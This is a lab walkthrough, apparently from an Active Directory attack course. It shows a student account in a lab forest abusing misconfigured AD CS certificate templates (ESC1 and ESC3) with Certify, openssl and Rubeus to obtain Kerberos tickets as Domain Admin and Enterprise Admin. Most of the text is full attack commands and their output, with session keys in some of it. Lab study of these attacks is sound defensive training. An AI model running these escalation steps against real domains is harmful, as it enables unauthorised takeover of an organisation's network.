# Learning Objective 21

## Tasks

1. **Check if AD CS is used by the target forest and find any vulnerable/abusable templates**
2. **Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin**

---

## Solution

1. **Check if AD CS is used by the target forest and find any vulnerable/abusable templates**

We can use the Certify tool to check for AD CS in `moneycorp`.

![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Certify.exe cas`:
```
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate authorities📌
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'


[*] Root CAs

    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local🏛️
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local

[SNIP]

    Enabled Certificate Templates:
        CA-Integration
        HTTPSCertificates
        SmartCardEnrollment-Agent
        SmartCardEnrollment-Users
        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        SubCA
        Administrator

[SNIP]
```

We can list all the templates using the following command. Going through the output we can find some interesting templates.

`C:\AD\Tools\Certify.exe find`:
```
[SNIP]

[*] Action: Find certificate templates📌
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[SNIP]

[*] Available Certificates Templates :

[SNIP]

CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Agent📜
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Certificate Request Agent📌
    mspki-certificate-application-policy  : Certificate Request Agent
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\Domain Users📌          S-1-5-21-719815819-3726368948-3917688648-513
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

[SNIP]

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : HTTPSCertificates📜
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT📌
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

[SNIP]
```
🚩

2. **Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin**

**Privilege Escalation to DA and EA using ESC1**

The template `HTTPSCertificates` looks interesting. Let's get some more information about it as it allows requestor to supply subject name.

`C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject`:
```
[SNIP]

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[SNIP]

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : HTTPSCertificates📜
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT📌
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\RDPUsers📌              S-1-5-21-719815819-3726368948-3917688648-1123
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

[SNIP]
```

Sweet! The `HTTPSCertificates` template grants enrollment rights to "RDPUsers" group and allows requestor to supply Subject Name. Recall that `student422` is a member of "RDPUsers" group. This means that we can request certificate for any user as `student422`.

Let's request a certificate for Domain Admin (`Administrator`).

`C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator`:
```
[SNIP]

[*] Action: Request a Certificates📌

[*] Current user context    : dcorp\student422
[*] No subject name specified, using current context as subject.

[*] Template                : HTTPSCertificates📜
[*] Subject                 : CN=student422, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] AltName                 : administrator🎭

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA🏛️

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 32

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----

[SNIP]

-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGYjCCBUqgAwIBAgITFQAAACCuzpyDfVxAaQAAAAAAIDANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTAyM...

[SNIP]

-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Copy all the text between `-----BEGIN RSA PRIVATE KEY-----` and `-----END CERTIFICATE-----` and save it to `esc1.pem`.

![ESC1 Certificate  esc1.pem](./assets/screenshots/learning_objective_21_esc1_certificate.png)

We need to convert it to PFX to use it. Use openssl binary on the student VM to do that. I will use "SecretPass@123" as the export password.

`C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx`:
```
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:
unable to write 'random state'
```

Use the PFX created above with Rubeus to request a TGT for DA `Administrator`!

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Got domain: dollarcorp.moneycorp.local
[*] Using PKINIT with etype rc4_hmac and subject: CN=student422, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dollarcorp.moneycorp.local\administrator'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/dollarcorp.moneycorp.local
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL🏛️
  UserName                 :  administrator🎭 (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  2/17/2025 1:19:23 PM
  EndTime                  :  2/17/2025 11:19:23 PM
  RenewTill                :  2/24/2025 1:19:23 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  HFHlvVDv+iG2RzjeC2tWog==
  ASREP (key)              :  5D5C30C91DDA538D4ADA3E2D7D7D27FC

[SNIP]
```

`klist`:
```
Current LogonId is 0:0x38c010

Cached Tickets: (1)

#0>     Client: administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/17/2025 13:19:23 (local)
        End Time:   2/17/2025 23:19:23 (local)
        Renew Time: 2/24/2025 13:19:23 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Check if we actually have DA privileges now.

`winrs -r:dcorp-dc cmd /c set username`:
```
USERNAME=Administrator
```

Awesome! We can use similar method to escalate to Enterprise Admin privileges. Request a certificate for Enterprise Administrator (`Administrator`).

`klist purge`:
```
Current LogonId is 0:0x38c010
        Deleting all tickets:
        Ticket(s) purged!
```

`C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator`:
```
[SNIP]

[*] Action: Request a Certificates📌

[*] Current user context    : dcorp\student422
[*] No subject name specified, using current context as subject.

[*] Template                : HTTPSCertificates📜
[*] Subject                 : CN=student422, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] AltName                 : moneycorp.local\administrator🎭

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 34

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----

[SNIP]

-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGcjCCBVqgAwIBAgITFQAAACINEjPjB5sKoQAAAAAAIjANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTAyM...

[SNIP]

-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

[SNIP]
```

Save the certificate to `esc1-EA.pem` and convert it to PFX. I will use "SecretPass@123" as the export password.

![ESC1 Certificate esc1-EA.pem](./assets/screenshots/learning_objective_21_esc1_ea_certificate.png)

`C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx`:
```
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:
unable to write 'random state'
```

Use Rubeus to request TGT for EA `Administrator`.

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:esc1-EA.pfx /password:SecretPass@123 /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Using PKINIT with etype rc4_hmac and subject: CN=student422, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'moneycorp.local\Administrator'
[*] Using domain controller: 172.16.1.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/moneycorp.local
  ServiceRealm             :  MONEYCORP.LOCAL🏛️
  UserName                 :  Administrator🎭 (NT_PRINCIPAL)
  UserRealm                :  MONEYCORP.LOCAL
  StartTime                :  2/17/2025 1:30:37 PM
  EndTime                  :  2/17/2025 11:30:37 PM
  RenewTill                :  2/24/2025 1:30:37 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  XbT8dZ0rQab1GGIVRuAjTw==
  ASREP (key)              :  4156D4E3F1206FA514CBD715C9D07C2F

[SNIP]
```

`klist`:
```
Current LogonId is 0:0x38c010

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ MONEYCORP.LOCAL
        Server: krbtgt📌/moneycorp.local @ MONEYCORP.LOCAL🏛️
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/17/2025 13:30:37 (local)
        End Time:   2/17/2025 23:30:37 (local)
        Renew Time: 2/24/2025 13:30:37 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Finally, access `mcorp-dc`!

`winrs -r:mcorp-dc cmd /c set username`:
```
USERNAME=Administrator
```
🚩

**Privilege Escalation to DA and EA using ESC3**

If we list vulnerable templates in `moneycorp`, we get the following result.

`C:\AD\Tools\Certify.exe find /vulnerable`:
```
[SNIP]

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[SNIP]

[!] Vulnerable Certificates Templates :

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Agent📜
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Certificate Request Agent📌
    mspki-certificate-application-policy  : Certificate Request Agent
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\Domain Users📌          S-1-5-21-719815819-3726368948-3917688648-513
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

[SNIP]
```

The `SmartCardEnrollment-Agent` template has EKU for `Certificate Request Agent` and grants enrollment rights to "Domain Users". If we can find another template that has an EKU that allows for domain authentication and has application policy requirement of certificate request agent, we can request certificate on behalf of any user.

`C:\AD\Tools\Certify.exe find`:
```
[SNIP]

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[SNIP]

[*] Available Certificates Templates :

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Agent📜
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Certificate Request Agent📌
    mspki-certificate-application-policy  : Certificate Request Agent
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\Domain Users📌          S-1-5-21-719815819-3726368948-3917688648-513
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

[SNIP]
```

Sweet! Now, request an Enrollment Agent Certificate from the template `SmartCardEnrollment-Agent`.

`C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent`:
```
[SNIP]

[*] Action: Request a Certificates📌

[*] Current user context    : dcorp\student422
[*] No subject name specified, using current context as subject.

[*] Template                : SmartCardEnrollment-Agent📜
[*] Subject                 : CN=student422, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 32

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----

[SNIP]

-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGWDCCBUCgAwIBAgITFQAAACAxny5Ez8uQJAAAAAAAIDANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTAyM...

[SNIP]

-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

[SNIP]
```

Like earlier, save the certificate text to `esc3.pem` and convert to PFX. Let's keep using "SecretPass@123" as the export password.

![ESC3 Certificate esc3.pem](./assets/screenshots/learning_objective_21_esc3_certificate.png)

`C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx`:
```
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:
unable to write 'random state'
```

Now we can use the Enrollment Agent Certificate to request a certificate for DA from the template `SmartCardEnrollment-Users`.

`C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123`:
```
[SNIP]

[*] Action: Request a Certificates📌

[*] Current user context    : dcorp\student422

[*] Template                : SmartCardEnrollment-Users📜
[*] On Behalf Of            : dcorp\administrator🎭

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA🏛️

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 33

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----

[SNIP]

-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGiTCCBXGgAwIBAgITFQAAACFm4hRI9tagOwAAAAAAITANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTAyM...

[SNIP]

-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Once again, save the certificate text to `esc3-DA.pem` and convert the PEM to PFX. Still using "SecretPass@123" as the export password.

![ESC3 Certificate esc3-DA.pem](./assets/screenshots/learning_objective_21_esc3_da_certificate.png)

`C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx`:
```
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:
unable to write 'random state'
```

Use the `esc3-DA.pfx` created above with Rubeus to request a TGT for DA.

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc3-DA.pfx /password:SecretPass@123 /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Got domain: dollarcorp.moneycorp.local
[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dollarcorp.moneycorp.local\administrator'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/dollarcorp.moneycorp.local
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL🏛️
  UserName                 :  administrator🎭 (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  2/18/2025 12:31:10 AM
  EndTime                  :  2/18/2025 10:31:10 AM
  RenewTill                :  2/25/2025 12:31:10 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  B6A5vSxiatauhFIxWrj4Fg==
  ASREP (key)              :  AB019B2EBA2BAB2CA9AA4435E6D2A3BC
```

`klist`:
```
Current LogonId is 0:0x38c010

Cached Tickets: (1)

#0>     Client: administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/18/2025 0:31:10 (local)
        End Time:   2/18/2025 10:31:10 (local)
        Renew Time: 2/25/2025 0:31:10 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Check if we actually have DA privileges now.

`winrs -r:dcorp-dc cmd /c set username`:
```
USERNAME=Administrator
```
🚩

To escalate to Enterprise Admin, we just need to make changes to request to the `SmartCardEnrollment-Users` template and Rubeus. Please note that we are using `/onbehalfof: mcorp\administrator` here.

`C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123`:
```
[SNIP]

[*] Action: Request a Certificates📌

[*] Current user context    : dcorp\student422

[*] Template                : SmartCardEnrollment-Users📜
[*] On Behalf Of            : mcorp\administrator🎭

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA🏛️

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 35

[*] cert.pem         :

[SNIP]

-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGYTCCBUmgAwIBAgITFQAAACMCMsil8oByjwAAAAAAIzANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTAyM...

[SNIP]

-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

![ESC3 Certificate esc3-EA.pem](./assets/screenshots/learning_objective_21_esc3_ea_certificate.png)

Convert the PEM to `esc3-EA.pfx` using openssl and use the PFX with Rubeus.

`C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-EA.pfx`:
```
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:
unable to write 'random state'
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-EA.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator, CN=Users, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'moneycorp.local\administrator'
[*] Using domain controller: 172.16.1.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/moneycorp.local
  ServiceRealm             :  MONEYCORP.LOCAL🏛️
  UserName                 :  administrator🎭 (NT_PRINCIPAL)
  UserRealm                :  MONEYCORP.LOCAL
  StartTime                :  2/18/2025 12:46:35 AM
  EndTime                  :  2/18/2025 10:46:35 AM
  RenewTill                :  2/25/2025 12:46:35 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  3M6YyJFE9vZov9XvIVttYw==
  ASREP (key)              :  FC0AB6D59B241E284B57F1FAB400CF9A
```

`klist`:
```
Current LogonId is 0:0x38c010

Cached Tickets: (1)

#0>     Client: administrator🎭 @ MONEYCORP.LOCAL
        Server: krbtgt📌/moneycorp.local @ MONEYCORP.LOCAL🏛️
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/18/2025 0:46:35 (local)
        End Time:   2/18/2025 10:46:35 (local)
        Renew Time: 2/25/2025 0:46:35 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Finally, access `mcorp-dc`!

`winrs -r:mcorp-dc cmd /c set username`:
```
USERNAME=Administrator
```
🚩

---
---
